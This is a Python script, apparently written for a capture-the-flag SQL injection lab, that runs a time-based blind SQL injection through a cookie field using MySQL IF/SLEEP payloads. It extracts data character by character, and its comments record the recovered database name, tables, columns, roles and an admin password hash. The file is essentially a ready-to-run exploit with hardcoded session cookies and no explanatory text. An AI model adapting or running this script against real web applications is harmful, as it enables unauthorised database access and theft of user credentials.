import sys, requests, urllib.parse, string, time
import threading

printable = string.printable
url = 'https://labs.matesctf.org/lab/sqli/2/index.php?page=shop&type=Mainboard'
#payload = "+ if(1=1,SLEEP(15),SLEEP(0))#";
#payload = "+ if(1=2,SLEEP(15),SLEEP(0))#";

#print(payload)
myheaders = {
    'Content-Type': 'application/x-www-form-urlencoded',
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
	'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'Accept-Encoding':'gzip, deflate'
}
original = "1+ "
#mydata = {'username': payload,'password': ''}
#mycookies = {"__cfduid": "df13ec5c65ea1fbb99c1d4db9854e64b91613617028", "PHPSESSID":"e42706785378ea73501482256b8eb432"}
#print(r"' or 1=1#");
#x = requests.post(url, data = mydata, cookies = mycookies, headers = myheaders, allow_redirects=False)
#print(x.status_code)
#f = open(r"C:\Users\AnhNH\Desktop\test2.html","w+", encoding="utf-8")
#f.write(x.text)
#f.close()
#print(x.text);


def getStringMultiThread(query, length, number, rangee, threadName):
	result = ''
	injection = ''
	mycookies = ''
    #range = length+1
	for k in range(number,rangee):
		# Ansii character 32 to 126
		for i in printable:
			key = urllib.parse.quote(i)
			payload = query + str(k) + ",1)='"
			injection = "if(%s%s',SLEEP(10),SLEEP(0))#"%(payload,key)
			injection = original + injection
			#print(injection)
			injection = urllib.parse.quote_plus(injection)
			mycookies = {"__cfduid": "df13ec5c65ea1fbb99c1d4db9854e64b91613617028", "PHPSESSID":"e42706785378ea73501482256b8eb432", "tracking_user_id": injection}
			#try:
			x = requests.post(url,cookies = mycookies, headers = myheaders, allow_redirects=False)#, timeout=9)
			time.sleep(0.1)
			if(x.elapsed.seconds > 10):
				result=result+key
				break
	output = "%s: %s"%(threadName, result)
	print(output)
	return output

def getString(query, length):
	result = ''
	injection = ''
	mycookies = ''
    #range = length+1
	for k in range(1,length+1):
		# Ansii character 32 to 126
		for i in printable:
			key = urllib.parse.quote(i)
			payload = query + str(k) + ",1)='"
			injection = "if(%s%s',SLEEP(5),SLEEP(0))#"%(payload,key)
			injection = original + injection
			print(injection)
			injection = urllib.parse.quote_plus(injection)
			mycookies = {"__cfduid": "df13ec5c65ea1fbb99c1d4db9854e64b91613617028", "PHPSESSID":"e42706785378ea73501482256b8eb432", "tracking_user_id": injection}
			#try:
			x = requests.post(url,cookies = mycookies, headers = myheaders, allow_redirects=False)#, timeout=9)
			time.sleep(0.1)
			if(x.elapsed.seconds > 5):
				result=result+key
				break
	return result


def getLength(query):
	# 1 to 100
	result = 0
	injection = ''
	mycookies = ''
	for i in range(1,101):	
		#print(key)
		payload = query + str(i)
		injection = "if(%s,SLEEP(5),SLEEP(0))#"%(payload)
		injection = original + injection
		print(injection)
		injection = urllib.parse.quote_plus(injection)
		mycookies = {"__cfduid": "df13ec5c65ea1fbb99c1d4db9854e64b91613617028", "PHPSESSID":"e42706785378ea73501482256b8eb432", "tracking_user_id": injection}
		x = requests.post(url,cookies = mycookies, headers = myheaders, allow_redirects=False)#, timeout=9)
		time.sleep(0.1)
		if(x.elapsed.seconds > 5):
			result=i
			break
	return result # -> 6
	
####### Get Length Table Schema ################################### -> 6
#+ if(length((select database()))=1,SLEEP(15),SLEEP(0))#
#query = "length((select database()))="	
#LengthTableSchema = getLength(query)
#print("LengthTableSchema: ", LengthTableSchema)
###################################################################
####### Get Table Schema ########################################## -> vstore
#+ if(substring((select database()),1,1)='a',SLEEP(15),SLEEP(0))#                                                          
#LengthTableSchema=6
#query = "substring((select database()),"
#TableSchemaName = getString(query, LengthTableSchema)
#print("TableSchemaName: ", TableSchemaName)
###################################################################
####### Get COUNT Table ########################################### -> 3             
#query = "abs((SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_SCHEMA=database()))="
#CountTable = getLength(query)
#print("CountTable: ", CountTable)
#########################################################################
####### Get LengthTable ################################################# -> length=22          
#query = "length((SELECT GROUP_CONCAT(table_name SEPARATOR '-') FROM information_schema.tables WHERE TABLE_SCHEMA=database()))="
#LengthTable = getLength(query)
#print("LengthTable: ", LengthTable)
#########################################################################
####### Get Table ####################################################### -> items-users-user_items 
# LengthTable = 22
# query = "substring((SELECT GROUP_CONCAT(table_name SEPARATOR '-') FROM information_schema.tables WHERE TABLE_SCHEMA=database()),"
# TableName = getString(query, LengthTable)
# print("TableName: ", TableName)
#########################################################################
####### Get Length Column ############################################### -> 42
# query = "length((SELECT GROUP_CONCAT(column_name SEPARATOR '-') FROM information_schema.columns WHERE TABLE_SCHEMA=database() and table_name='users'))="
# LengthCol = getLength(query)
# print("LengthCol: ", LengthCol)
####### Get Column####################################################### -> id-username-name-email-password-role-money
#LengthCol = 42
#query = "substring((SELECT GROUP_CONCAT(column_name SEPARATOR '-') FROM information_schema.columns WHERE TABLE_SCHEMA=database() and table_name='users'),"
#ColName = getString(query, LengthCol)
#print("ColName: ", ColName)
#########################################################################
####### Get Data ######################################################## 10 user-admin
# query = "length((SELECT GROUP_CONCAT(DISTINCT(role) SEPARATOR '-') FROM users))="
# LengthRole = getLength(query)
# print("LengthRole: ", LengthRole)
# LengthRole = 10
# query = "substring((SELECT GROUP_CONCAT(DISTINCT(role) SEPARATOR '-') FROM users),"
# DataName = getString(query, LengthRole)
# print("ColName: ", DataName)
######################################################################## password 40 1c16d7f716baa9ff41e16dbc6b4e144acc5dcaeb
#query = "length((SELECT GROUP_CONCAT(password) FROM users WHERE role='admin'))="
#LengthPass = getLength(query)
#print("LengthPass: ", LengthPass)
LengthPass = 40
query = "substring((SELECT GROUP_CONCAT(password) FROM users WHERE role='admin'),"
Flag = getString(query, LengthPass)
print("ColName: ", Flag)
# try:
	# t1 = threading.Thread(target = getStringMultiThread,args=(query, LengthPass, 1, 10+1,"Thread-1",))
	# t2 = threading.Thread(target = getStringMultiThread,args=(query, LengthPass, 11, 20+1,"Thread-2",))
	# t3 = threading.Thread(target = getStringMultiThread,args=(query, LengthPass, 21, 30+1,"Thread-3",))
	# t4 = threading.Thread(target = getStringMultiThread,args=(query, LengthPass, 31, 40+1,"Thread-4",))
    
	# t1.start()
	# t2.start()
	# t3.start()
	# t4.start()

# except Exception as errtxt:
	# print(errtxt)


